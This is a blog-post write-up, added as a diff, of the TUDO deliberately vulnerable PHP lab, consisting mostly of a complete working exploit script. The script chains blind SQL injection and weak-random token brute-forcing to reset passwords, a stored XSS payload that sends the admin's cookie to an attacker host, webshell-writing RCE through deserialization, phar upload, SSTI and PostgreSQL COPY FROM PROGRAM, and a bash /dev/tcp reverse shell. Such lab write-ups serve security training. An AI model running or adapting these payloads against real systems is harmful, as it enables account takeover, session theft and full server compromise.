@@ -1,0 +1,300 @@
+---
+layout: post
+title:  "Writeup TUDO"
+date:   2022-11-07 22:08:00 +0900
+categories: security
+---
+
+# TUDO
+[https://github.com/bmdyy/tudo](https://github.com/bmdyy/tudo)
+
+# Summary
+- Authentication Bypass
+    - SQL Injection / forgotusername.php
+    - Weak Random / forgotpassword.php
+- Previledge Escalation
+    - XSS / index.php(user's description)
+- RCE
+    - Insecure Deserialization / admin/import_user.php
+        - use Log class
+    - SSTI / admin/update_motd.php
+    - File Upload / admin/upload_image.php
+        - use polyglot phar
+    - SQL Injection / forgotusername.php
+        - without Authentication Bypass
+
+# PoC
+
+**poc.py**
+
+```python
+import os
+import requests
+import sys
+import subprocess
+from flask import Flask, request, make_response
+from flask_cors import CORS
+import uuid
+import base64
+
+target = "172.17.0.2"
+proxies = {'http':'127.0.0.1:8080'}
+session = requests.session()
+app = Flask(__name__)
+CORS(app)
+admin_headers = {
+    'Cookie': None
+}
+shell_file_name_deserialization = "%s.php" % str(uuid.uuid1())
+shell_file_name_file_upload = "%s.phar" % str(uuid.uuid1())
+rhsell_command = 'bash -c "bash -i >& /dev/tcp/172.17.0.1/9292 0>&1"'
+rshell_params = {
+    'cmd': rhsell_command
+}
+
+def log(*s):
+    try:
+        if os.environ["DEBUG"]:
+            print(*s)
+    except KeyError:
+        pass
+
+def make_request(url, data):
+    return requests.post(url, data, proxies=proxies)
+
+def is_success_sqli(response):
+    return 'User exists!' in response.text
+
+def prefix_sql():
+    return "1337' OR "
+
+# MySQL:      #comment, -- comment, /*comment*/
+# PostgreSQL: --comment, /*comment*/
+#
+# Reference:
+# https://portswigger.net/web-security/sql-injection/cheat-sheet
+def suffix_sql():
+    return " LIMIT 1 --"
+
+def obfuscate(sql):
+    return sql
+
+def sqli(url, table, column, condition=''):
+    ret = ''
+    base_sql = "(SELECT (CASE WHEN ((SELECT COUNT(*) FROM {table} WHERE %s SUBSTRING(CONCAT({column}, ''), 1, LENGTH('{ret}')) = '{ret}' AND ASCII(SUBSTRING(CONCAT({column}, ''), {order}, 1)) {operator} {expected}) > 0) THEN true ELSE false END))" % condition
+    base_sql = obfuscate(prefix_sql() + base_sql + suffix_sql())
+    for order in range(1, 100):
+        # every possible character in the ASCII printable set
+        # https://en.wikipedia.org/wiki/ASCII
+        min = 32
+        max = 126
+        log("order", order)
+        while min < max:
+            mid = (min + max) // 2
+            log("min = %i, mid = %i, max = %i" % (min, mid, max))
+            sql = base_sql.format(table=table, column=column, order=order, expected=mid, operator='<=', ret=ret)
+            log("sql =", sql)
+            res = make_request(url, {'username':sql})
+            if is_success_sqli(res):
+                max = mid
+                log("200")
+            else:
+                min = mid + 1
+                log("500")
+
+        if min == 0:
+            break
+        log("min = %i, mid = %i, max = %i" % (min, mid, max))
+        sql = base_sql.format(table=table, column=column, condition=condition, order=order, expected=min, operator='=', ret=ret)
+        res = make_request(url, {'username':sql})
+
+        if is_success_sqli(res):
+            ret += chr(min)
+            print(ret)
+        else:
+            break
+
+    return ret
+
+def issue_token(target_user):
+    res = requests.post("http://%s/forgotpassword.php" % target, data={'username':target_user}, proxies=proxies)
+    if 'Email sent!' in res.text:
+        print("(+) Successfully issued token")
+    else:
+        print("(+) Failed to issue token")
+        sys.exit(-1)
+
+def retrieve_token():
+    print("(+) Retrieving token")
+    return sqli("http://%s/forgotusername.php" % target, "tokens", "token")
+
+def reset_password(token, new_password):
+    res = requests.post("http://%s/resetpassword.php" % target, data={'token':token, 'password1':new_password, 'password2':new_password}, proxies=proxies)
+    if 'Password changed!' in res.text:
+        print("(+) Successfully changed password")
+    else:
+        print("(+) Failed to changed password")
+        sys.exit(-1)
+
+def auth_bypass1(target_user, new_password):
+    issue_token(target_user)
+    token = retrieve_token()
+    print("token:", token)
+    reset_password(token, new_password)
+
+def forgot_password(user):
+    res = requests.post("http://%s/forgotpassword.php" % target, data={'username':user})
+    if 'Email sent!' in res.text:
+        print("(+) Successfully password change request")
+    else:
+        print("(+) Failed to password change request")
+        sys.exit(-1)
+
+def generate_tokens(date1, date2):
+    print("(+) Generating tokens")
+    print("date1:", date1)
+    print("date2:", date2)
+    tokens = subprocess.run("php -f generate_tokens.php %s %s" % (date1, date2), shell=True, capture_output=True).stdout.decode('utf-8')
+    print("(+) Success")
+
+    return tokens
+
+def bruteforce_tokens(tokens):
+    print("(+) Finding token")
+    for token in tokens:
+        res = requests.get("http://%s/resetpassword.php?token=%s" % (target, token))
+        if 'Token is invalid.' in res.text:
+            pass
+        else:
+            print("(+) Success")
+            print("token:", token)
+            return token
+    print("(+) Valid token could not found")
+    sys.exit(-1)
+
+# faster then auth_bypass1
+def auth_bypass2(target_user, new_password):
+    date1 = subprocess.run("date +%s%3N", shell=True, capture_output=True).stdout.decode('utf-8').strip()
+    forgot_password(target_user)
+    date2 = subprocess.run("date +%s%3N", shell=True, capture_output=True).stdout.decode('utf-8').strip()
+    tokens = generate_tokens(date1, date2)
+    token = bruteforce_tokens(tokens.split("\n"))
+    reset_password(token, new_password)
+
+def login(user, password):
+    res = session.post("http://%s/login.php" % target, data={'username':user,'password':password}, proxies=proxies)
+
+    if 'Login Failed' in res.text:
+        print("(+) Login Failed")
+        sys.exit(-1)
+    else:
+        print("(+) Login Success")
+
+def xss():
+    session.get("http://%s/profile.php" % target)
+    res = session.post("http://%s/profile.php" % target, data={'description':'<script>fetch(`http://172.17.0.1/callback?${document.cookie}`)</script>'}, proxies=proxies)
+    if 'Success' in res.text:
+        print("(+) XSS Success")
+    else:
+        print("(+) XSS Failed")
+        sys.exit(-1)
+
+@app.route('/callback', methods=['GET'])
+def callback():
+    global admin_headers
+
+    if admin_headers["Cookie"] != None:
+        return make_response("OK")
+
+    cookie = request.args["PHPSESSID"]
+    print("admin's PHPSESSID:", cookie)
+    admin_headers["Cookie"] = 'PHPSESSID=%s' % cookie
+
+    rce3()
+    return make_response("OK")
+
+def rce1():
+    print("(+) Starting RCE by Insecure Deserialization")
+
+    data = {
+        'userobj': 'O:3:"Log":2:{s:1:"f";s:54:"/var/www/html/%s";s:1:"m";s:34:"<?php echo(exec($_GET["cmd"])); ?>";}' % shell_file_name_deserialization
+    }
+    requests.post("http://%s/admin/import_user.php" % target, data=data, headers=admin_headers, proxies=proxies)
+
+    requests.get("http://%s/%s" % (target, shell_file_name_deserialization), params=rshell_params, proxies=proxies)
+
+# !!! sample.png must be prepared !!!
+def rce2():
+    print("(+) Starting RCE by File Upload")
+    comment = '<?php echo "Command:"; if($_GET){system($_GET["cmd"]);} __halt_compiler();'
+    cmd = 'exiftool -Comment=\'%s\' -o %s sample.png' % (comment, shell_file_name_file_upload)
+    subprocess.run(cmd, shell=True)
+    files = {
+        'image': (shell_file_name_file_upload, open(shell_file_name_file_upload, 'rb'), 'image/png')
+    }
+    requests.post("http://%s/admin/upload_image.php" % target, headers=admin_headers, proxies=proxies, files=files)
+    requests.get("http://%s/images/%s" % (target, shell_file_name_file_upload), params=rshell_params)
+
+def rce3():
+    print("(+) Starting RCE by SSTI")
+
+    shell_file_name = "backdoor.php"
+    payload = '<?php echo(exec($_GET["cmd"])); ?>'
+    base_command = "echo '%s' > /var/www/html/%s" % (payload, shell_file_name)
+    base_command_b64 = base64.b64encode(base_command.encode('utf-8')).decode('utf-8')
+    command = 'eval $(echo %s | base64 -d)' % base_command_b64
+    data = {
+        'message': "{php}echo `%s`;{/php}" % command
+    }
+    session.post("http://%s/admin/update_motd.php" % target, data=data, headers=admin_headers, proxies=proxies)
+    session.get("http://%s/" % target, proxies=proxies)
+    session.get("http://%s/%s" % (target, shell_file_name), params=rshell_params, proxies=proxies)
+
+# Without Authentication
+def rce4():
+    print("(+) RCE by SQLi")
+
+    username = "haxhaxhax';\r\n"
+    username += "DROP TABLE IF EXISTS cmd_exec;\r\n"
+    username += "CREATE TABLE cmd_exec(cmd_output text);\r\n"
+    username += "COPY cmd_exec FROM PROGRAM '%s';-- " % rhsell_command
+    data = {
+        'username': username
+    }
+    requests.post("http://%s/forgotusername.php" % target, data=data, proxies=proxies)
+
+if __name__ == '__main__':
+    '''Authentication Bypass'''
+    target_user = "user2"
+    new_password = "oswe"
+
+    auth_bypass2(target_user, new_password)
+
+    login(target_user, new_password)
+
+    xss()
+
+    app.run(host='0.0.0.0', port=80)
+```
+
+**generate_tokens.php**
+
+```php
+<?php
+function generateToken($seed) {
+    srand($seed);
+    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_';
+    $ret = '';
+    for ($i = 0; $i < 32; $i++) {
+        $ret .= $chars[rand(0,strlen($chars)-1)];
+    }
+    return $ret;
+}
+
+$s = intval($argv[1]);
+$e = intval($argv[2]);
+for ($i = $s; $i <= $e; $i++) {
+    echo(generateToken($i) . "\n");
+}
+?>
+```
